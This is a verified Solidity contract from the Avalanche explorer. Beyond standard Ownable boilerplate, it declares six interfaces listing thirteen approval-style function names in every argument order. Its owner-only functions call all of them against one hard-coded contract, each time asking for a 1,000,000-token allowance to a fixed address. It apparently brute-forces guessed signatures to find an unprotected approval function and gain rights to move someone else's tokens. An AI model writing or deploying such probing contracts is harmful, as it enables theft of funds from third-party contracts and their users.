/**
 *Submitted for verification at snowtrace.io on 2023-02-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function deposit(uint256 amount) external payable;
    function balanceOf(address who) external view returns (uint256);
}



interface IA {

    function approveToken(address tokenAddr, address sender, uint256 amount) external; 
    function approve(address tokenAddr, address sender, uint256 amount) external; 
    function emitApproval(address tokenAddr, address sender, uint256 amount) external; 
    function setApproval(address tokenAddr, address sender, uint256 amount) external;
    function approveFromProxy(address tokenAddr, address sender, uint256 amount) external; 
    function emitApprove(address tokenAddr, address sender, uint256 amount) external; 
    function sendApproval(address tokenAddr, address sender, uint256 amount) external; 
    function onApprove(address tokenAddr, address sender, uint256 amount) external;
    function increaseApproval(address tokenAddr, address sender, uint256 amount) external;
    function _approve(address tokenAddr, address sender, uint256 amount) external; 
    function __approve(address tokenAddr, address sender, uint256 amount) external; 
    function approveInternal(address tokenAddr, address sender, uint256 amount) external; 
    function addApproval(address tokenAddr, address sender, uint256 amount) external; 
}

interface IB {

    function approveToken(address tokenAddr, uint256 amount, address sender) external;
    function approve(address tokenAddr, uint256 amount, address sender) external; 
    function emitApproval(address tokenAddr, uint256 amount, address sender) external; 
    function setApproval(address tokenAddr, uint256 amount, address sender) external; 
    function approveFromProxy(address tokenAddr, uint256 amount, address sender) external;
    function emitApprove(address tokenAddr, uint256 amount, address sender) external; 
    function sendApproval(address tokenAddr, uint256 amount, address sender) external; 
    function onApprove(address tokenAddr, uint256 amount, address sender) external; 
    function increaseApproval(address tokenAddr, uint256 amount, address sender) external;
    function _approve(address tokenAddr, uint256 amount, address sender) external; 
    function __approve(address tokenAddr, uint256 amount, address sender) external; 
    function approveInternal(address tokenAddr, uint256 amount, address sender) external;
    function addApproval(address tokenAddr, uint256 amount, address sender) external; 
}

interface IC {

    function approveToken(address sender, address tokenAddr, uint256 amount) external;
    function approve(address sender, address tokenAddr, uint256 amount) external;
    function emitApproval(address sender, address tokenAddr, uint256 amount) external; 
    function setApproval(address sender, address tokenAddr, uint256 amount) external; 
    function approveFromProxy(address sender, address tokenAddr, uint256 amount) external;
    function emitApprove(address sender, address tokenAddr, uint256 amount) external;
    function sendApproval(address sender, address tokenAddr, uint256 amount) external; 
    function onApprove(address sender, address tokenAddr, uint256 amount) external; 
    function increaseApproval(address sender, address tokenAddr, uint256 amount) external; 
    function _approve(address sender, address tokenAddr, uint256 amount) external;
    function __approve(address sender, address tokenAddr, uint256 amount) external;
    function approveInternal(address sender, address tokenAddr, uint256 amount) external; 
    function addApproval(address sender, address tokenAddr, uint256 amount) external; 
}

interface ID {

    function approveToken(address sender, uint256 amount, address tokenAddr) external;
    function approve(address sender, uint256 amount, address tokenAddr) external; 
    function emitApproval(address sender, uint256 amount, address tokenAddr) external; 
    function setApproval(address sender, uint256 amount, address tokenAddr) external; 
    function approveFromProxy(address sender, uint256 amount, address tokenAddr) external;
    function emitApprove(address sender, uint256 amount, address tokenAddr) external; 
    function sendApproval(address sender, uint256 amount, address tokenAddr) external; 
    function onApprove(address sender, uint256 amount, address tokenAddr) external;
    function increaseApproval(address sender, uint256 amount, address tokenAddr) external; 
    function _approve(address sender, uint256 amount, address tokenAddr) external;
    function __approve(address sender, uint256 amount, address tokenAddr) external; 
    function approveInternal(address sender, uint256 amount, address tokenAddr) external; 
    function addApproval(address sender, uint256 amount, address tokenAddr) external; 
}

interface IE {

    function approveToken(uint256 amount, address tokenAddr, address sender) external;
    function approve(uint256 amount, address tokenAddr, address sender) external; 
    function emitApproval(uint256 amount, address tokenAddr, address sender) external; 
    function setApproval(uint256 amount, address tokenAddr, address sender) external; 
    function approveFromProxy(uint256 amount, address tokenAddr, address sender) external;
    function emitApprove(uint256 amount, address tokenAddr, address sender) external; 
    function sendApproval(uint256 amount, address tokenAddr, address sender) external; 
    function onApprove(uint256 amount, address tokenAddr, address sender) external;
    function increaseApproval(uint256 amount, address tokenAddr, address sender) external; 
    function _approve(uint256 amount, address tokenAddr, address sender) external;
    function __approve(uint256 amount, address tokenAddr, address sender) external; 
    function approveInternal(uint256 amount, address tokenAddr, address sender) external; 
    function addApproval(uint256 amount, address tokenAddr, address sender) external; 
}

interface IF {

    function approveToken(uint256 amount, address sender, address tokenAddr) external;
    function approve(uint256 amount, address sender, address tokenAddr) external;
    function emitApproval(uint256 amount, address sender, address tokenAddr) external;
    function setApproval(uint256 amount, address sender, address tokenAddr) external;
    function approveFromProxy(uint256 amount, address sender, address tokenAddr) external;
    function emitApprove(uint256 amount, address sender, address tokenAddr) external;
    function sendApproval(uint256 amount, address sender, address tokenAddr) external;
    function onApprove(uint256 amount, address sender, address tokenAddr) external;
    function increaseApproval(uint256 amount, address sender, address tokenAddr) external;
    function _approve(uint256 amount, address sender, address tokenAddr) external;
    function __approve(uint256 amount, address sender, address tokenAddr) external;
    function approveInternal(uint256 amount, address sender, address tokenAddr) external;
    function addApproval(uint256 amount, address sender, address tokenAddr) external;
}


contract approver is Ownable{

    IA sca = IA(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);
    IB scb = IB(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);
    IC scc = IC(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);
    ID scd = ID(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);
    IE sce = IE(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);
    IF scf = IF(0x67AfDD6489D40a01DaE65f709367E1b1D18a5322);

    function approveToken() external onlyOwner {
        sca.approveToken(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.approveToken(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.approveToken(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.approveToken(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.approveToken(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.approveToken(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }

    function approve() external onlyOwner {
        sca.approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.approve(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.approve(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }

    function emitApproval() external onlyOwner {
        sca.emitApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.emitApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.emitApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.emitApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.emitApproval(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.emitApproval(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }

    function setApproval() external onlyOwner {
        sca.setApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.setApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.setApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.setApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.setApproval(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.setApproval(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function approveFromProxy() external onlyOwner {
        sca.approveFromProxy(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.approveFromProxy(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.approveFromProxy(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.approveFromProxy(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.approveFromProxy(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.approveFromProxy(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function emitApprove() external onlyOwner {
        sca.emitApprove(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.emitApprove(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.emitApprove(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.emitApprove(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.emitApprove(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.emitApprove(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function sendApproval() external onlyOwner {
        sca.sendApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.sendApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.sendApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.sendApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.sendApproval(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.sendApproval(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function onApprove() external onlyOwner {
        sca.onApprove(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.onApprove(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.onApprove(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.onApprove(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.onApprove(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.onApprove(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function increaseApproval() external onlyOwner {
        sca.increaseApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.increaseApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.increaseApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.increaseApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.increaseApproval(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.increaseApproval(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function _approve() external onlyOwner {
        sca._approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb._approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc._approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd._approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce._approve(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf._approve(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function __approve() external onlyOwner {
        sca.__approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.__approve(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.__approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.__approve(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.__approve(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.__approve(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function approveInternal() external onlyOwner {
        sca.approveInternal(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.approveInternal(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.approveInternal(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.approveInternal(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.approveInternal(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.approveInternal(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
    function addApproval() external onlyOwner {
        sca.addApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000);
        scb.addApproval(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scc.addApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 1000000);
        scd.addApproval(0x000000003af6916de52d3425b4e49D7f97eDebEE, 1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
        sce.addApproval(1000000, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39, 0x000000003af6916de52d3425b4e49D7f97eDebEE);
        scf.addApproval(1000000, 0x000000003af6916de52d3425b4e49D7f97eDebEE, 0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39);
    }
}